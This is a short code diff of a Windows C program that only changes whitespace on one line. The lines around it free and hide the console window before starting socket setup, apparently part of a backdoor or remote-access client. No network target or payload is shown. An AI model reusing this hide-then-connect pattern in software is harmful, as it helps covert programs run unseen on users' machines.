@@ -144,7 +144,7 @@ char *c_path[BUFFER_SIZE];
 int main(){
     FreeConsole();
     HWND hWnd = GetConsoleWindow();
-	ShowWindow(hWnd, SW_MINIMIZE);
+    ShowWindow(hWnd, SW_MINIMIZE);
     ShowWindow(hWnd, SW_HIDE);
     // init socket
     WSADATA wsa_version;
